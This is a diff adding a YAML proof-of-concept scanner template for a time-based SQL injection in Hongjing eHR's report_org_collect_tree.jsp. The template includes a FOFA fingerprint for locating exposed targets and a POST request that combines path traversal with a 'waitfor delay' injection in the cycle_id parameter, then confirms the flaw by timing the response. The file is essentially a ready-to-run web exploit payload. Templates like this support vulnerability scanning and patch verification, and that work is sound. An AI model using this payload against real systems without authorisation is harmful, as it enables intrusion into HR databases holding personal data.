@@ -1,0 +1,29 @@
+id: poc-yaml-hongjing-ehr-report-org-collect-tree-sqli
+info:
+  name: 宏景eHR report_org_collect_tree.jsp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 宏景eHR
+  fofa: app="HJSOFT-HCM"
+variables:
+  t1: random_int(4,9)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /templates/attestation/../../report/report_collect/report_org_collect_tree.jsp
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: params=&isAction=2&cycle_id=2;waitfor%20delay%20'0:0:{{.t1}}'--%20
+  expression: 'status_code == 200 &&
+
+    body == "" &&
+
+    contains(content_type,"text/xml") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
